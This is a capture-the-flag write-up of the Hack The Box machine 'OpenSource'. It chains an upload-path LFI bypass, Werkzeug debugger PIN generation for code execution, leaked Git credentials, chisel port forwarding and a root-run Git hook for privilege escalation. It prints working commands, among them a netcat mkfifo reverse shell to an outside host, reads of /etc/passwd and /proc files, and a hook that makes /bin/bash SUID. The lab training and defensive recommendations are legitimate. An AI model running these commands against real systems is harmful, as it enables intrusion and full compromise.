# HTB - OpenSource

**IP Address:** `10.10.11.164`  
**OS:** Ubuntu (Bionic)  
**Difficulty:** Medium  
**Tags:** #Web, #Flask, #Docker, #Werkzeug, #LFI, #Git, #PortForwarding, #PrivilegeEscalation

---
## Synopsis

OpenSource is a medium Linux machine that combines several vulnerabilities into a chained exploitation path.  
The attack begins with **web enumeration** to identify an upload service and a downloadable `source.zip` file containing Docker code.  
An insecure file upload function is abused to perform **LFI** and read system files, which are then leveraged to calculate the **Werkzeug console PIN** for RCE.  
From a container foothold, Git branches are analyzed to discover leaked credentials.  
Through **port forwarding** with `chisel`, access to a private Gitea service is achieved, revealing an SSH key for user access.  
Privilege escalation is performed by abusing **Git hooks** executed as root via cron.

---
## Skills Required

- Web enumeration and fuzzing  
- Understanding of LFI and bypass techniques  
- Knowledge of Docker/container isolation  
- Familiarity with Git branching and commit logs  
- Remote port forwarding with `chisel`

## Skills Learned

- Exploiting Werkzeug debug console via PIN generation  
- Using `curl --path-as-is` to bypass path normalization  
- Leveraging Git logs/branches to extract credentials  
- Setting up reverse port forwarding with `chisel`  
- Abusing Git hooks for privilege escalation

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

```bash
ping -c 1 10.10.11.164
```

![](screenshots/ping.png)

### 1.2 Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![](screenshots/allports.png)

Extract open ports:

```bash
extractPorts allPorts
```

![](screenshots/extractports.png)

### 1.3 Targeted Scan

```bash
nmap -p22,80 -sC -sV 10.10.11.164 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

``` bash
cat targeted -l java
```

![](screenshots/targeted.png)

**Findings:**

| Port | Service | Version/Description |
|------|---------|---------------------|
| 22   | SSH     | OpenSSH (Ubuntu Bionic) |
| 80   | HTTP    | Python/Flask web service |

We can sheck the OpenSSH version in Launchpad:



---
## 2. Web Enumeration

### 2.1 Technology Fingerprinting

```bash
whatweb http://10.10.11.164
```

![](screenshots/whatweb.png)

The service appears to be running on **Python Flask**.

### 2.2 Exploring the Website

![](screenshots/web.png)


- `Download` → retrieves a file `source.zip`  

![](screenshots/source_downloaded.png)

- `Take me there!` → redirects to `/uplcloud` (file upload interface)  
  
![](screenshots/web_upcloud.png)

Testing file upload with `test.txt`:

![](screenshots/web_upcloud_test.png)

Tap in `file`:

![](screenshots/web_test.png)

Attempting **SSTI** with `{{7*7}}` fails:

![](screenshots/web_7_ssti.png)

### 2.3 Fuzzing for Hidden Directories

Let's use WFUZZ to find sub-domains:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.164/FUZZ
```

![](screenshots/wfuzz.png)

Discovered **/console** endpoint, a Werkzeug debugger console:

![](screenshots/web_console.png)

### 2.4 Local File Inclusion via Upload Bypass

Analysis of `utils.py` from **source.zip** file downloaded shows path sanitization in `./`: 

![](screenshots/source_utils.png)

But bypassable with `..//`.

```bash
curl http://10.10.11.164/uploads/..//etc/passwd --path-as-is
```

![](screenshots/curl_etc_passwd.png)

---
## 3. Exploitation

### 3.1 Werkzeug Console PIN Generation

Following HackTricks methodology, required values were extracted:

- Username: `root`  
- Flask app path discovered via BurpSuite:  
![](screenshots/burpsuite_path.png)
- MAC address → converted to decimal:  
  ```bash
  curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is
  ```
![](screenshots/curl_mac_address.png)
![](screenshots/python_mac_decimal.png)
- Boot ID:  
  ```bash
  curl http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --path-as-is --ignore-content-length
  ```
![](screenshots/curl_boot_id.png)
- Cgroup:  
  ```bash
  curl http://10.10.11.164/uploads/..//proc/self/cgroup --path-as-is --ignore-content-length
  ```
![](screenshots/curl_cgroup.png)

PIN generated successfully:

![](screenshots/generate_pin_executed.png)

Access granted to console:

![](screenshots/web_console_login.png)
![](screenshots/web_console_whoami.png)

### 3.2 Remote Shell

```bash
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443").read().strip()
```

![](screenshots/web_console_send_bash.png)

Gained shell inside **Docker container**:

![](screenshots/container.png)

---
## 4. Foothold

### 4.1 Investigating Git Repository

Logs in the downloaded source:

```bash
git log
git branch
git log dev
git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
```

![](screenshots/git_log_public.png)
![](screenshots/git_branch.png)
![](screenshots/git_log_dev.png)
![](screenshots/git_show_credentials.png)

Credentials found:  
`dev01:Soulless_Developer#2022`

### 4.2 Port Discovery from Container

```bash
nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164
```

![](screenshots/nmap_filtered_ports.png)

Discovered **port 3000**. From container:

```bash
ip a
ping -c 1 172.17.0.1
wget http://172.17.0.1:3000/ -qO-
```

![](screenshots/container_ip.png)
![](screenshots/gitea.png)

### 4.3 Remote Port Forwarding with Chisel

```bash
gunzip chisel.gz
chmod +x chisel
python -m http.server
wget http://10.10.14.10:8000/chisel
```

![](screenshots/chisel.png)

- Attacker as server:
  ```bash
  ./chisel server -reverse -p 1234
  ```
- Victim as client:
  ```bash
  ./chisel client 10.10.14.10:1234 R:3000:172.17.0.1:3000
  ```

![](screenshots/chisel_execute.png)

Now accessible locally:

![](screenshots/gitea_localhost.png)

Login with discovered credentials:

![](screenshots/gitea_login.png)

SSH private key found in repo:

![](screenshots/gitea_id_rsa.png)

SSH access as `dev01`:

![](screenshots/user_flag.png)

✅ User flag obtained

---
## 5. Privilege Escalation

### 5.1 Process Monitoring with pspy

```bash
wget http://10.10.14.10:8000/pspy64
chmod +x pspy64
./pspy64
```

![](screenshots/git_sync_pspy.png)
![](screenshots/git_scan_code.png)

A cron-executed script performs `git commit` as **root**.

### 5.2 Abusing Git Hooks

Inspecting hooks:

![](screenshots/git_hooks.png)

Create malicious pre-commit hook:

```bash
echo 'chmod u+s /bin/bash' > ~/.git/hooks/pre-commit
chmod +x ~/.git/hooks/pre-commit 
```

![](screenshots/git_hooks_add_bash.png)

After cron executes:

```bash
bash -p
```

![](screenshots/root_flag.png)

🏁 Root flag obtained

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Web Enumeration** → Found file upload & `source.zip`.  
2. **LFI Bypass** → Used `curl --path-as-is` with `..//`.  
3. **Werkzeug PIN Exploit** → Generated debugger PIN → RCE.  
4. **Container Shell** → Gained limited foothold.  
5. **Git Branch Analysis** → Extracted credentials.  
6. **Port Forwarding with Chisel** → Accessed private Gitea.  
7. **SSH Key** → Logged in as `dev01`.  
8. **Privilege Escalation** → Abused Git hooks run by root cron.  

---
## Defensive Recommendations

- Disable access to Werkzeug debug console in production.  
- Implement stricter validation/sanitization for file uploads.  
- Restrict container privileges and network visibility.  
- Avoid storing credentials/keys in Git repositories.  
- Audit cron jobs and remove risky automation with root privileges.  
- Enforce principle of least privilege for developers and services.
